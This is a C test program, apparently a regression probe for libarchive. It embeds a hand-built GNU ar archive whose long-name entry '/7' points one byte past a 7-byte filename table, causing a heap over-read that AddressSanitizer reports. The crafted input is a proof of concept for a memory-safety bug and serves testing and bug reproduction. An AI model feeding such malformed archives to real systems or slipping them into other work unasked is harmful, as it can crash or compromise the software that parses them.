/*
 * Probe: GNU ar long-name lookup at an offset equal to the filename
 * table size, driven through libarchive's public reading API.
 *
 * The archive carries a 7-byte "//" filename table ("name1/\n") and a
 * following entry named "/7", i.e. a long-name reference to byte offset
 * 7 -- exactly one past the last byte of the table.
 *
 * Build: linked against an AddressSanitizer build of libarchive.
 * Run: on a tree where the long-name bounds check tolerates
 * offset == table size while the table allocation is exactly
 * strtab_size bytes, archive_read_next_header() reads one byte past
 * the end of the heap-allocated filename table and ASan aborts.
 */

#include <stdio.h>
#include <stddef.h>
#include "archive.h"
#include "archive_entry.h"

/* Ask the sanitizer runtime to abort (SIGABRT) on the first report. */
const char *__asan_default_options(void);
const char *
__asan_default_options(void)
{
	return ("abort_on_error=1:halt_on_error=1");
}

static const unsigned char ar_data[] = {
	/* "!<arch>\n" */
	0x21, 0x3c, 0x61, 0x72, 0x63, 0x68, 0x3e, 0x0a,
	/* member header: "//" (GNU filename table), size 7 */
	0x2f, 0x2f, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x30, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20,
	0x30, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x30, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x30, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x37, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20,
	0x60, 0x0a,
	/* the 7-byte filename table: "name1/\n" */
	0x6e, 0x61, 0x6d, 0x65, 0x31, 0x2f, 0x0a,
	/* pad byte (odd member size) */
	0x0a,
	/* member header: "/7" (long name at table offset 7), size 0 */
	0x2f, 0x37, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x30, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20,
	0x30, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x30, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x30, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x30, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20,
	0x60, 0x0a,
};

int
main(void)
{
	struct archive *a;
	struct archive_entry *entry;
	const char *pathname;
	int rc;

	a = archive_read_new();
	if (a == NULL) {
		fprintf(stderr, "archive_read_new failed\n");
		return (1);
	}
	if (archive_read_support_format_ar(a) != ARCHIVE_OK) {
		fprintf(stderr, "support_format_ar: %s\n",
		    archive_error_string(a));
		archive_read_free(a);
		return (1);
	}
	if (archive_read_open_memory(a, ar_data, sizeof(ar_data))
	    != ARCHIVE_OK) {
		fprintf(stderr, "open_memory: %s\n", archive_error_string(a));
		archive_read_free(a);
		return (1);
	}

	while ((rc = archive_read_next_header(a, &entry)) == ARCHIVE_OK
	    || rc == ARCHIVE_WARN) {
		pathname = archive_entry_pathname(entry);
		printf("entry: %s\n",
		    pathname != NULL ? pathname : "(none)");
	}

	printf("final result: %d (%s)\n", rc, archive_error_string(a));
	archive_read_free(a);
	return (0);
}
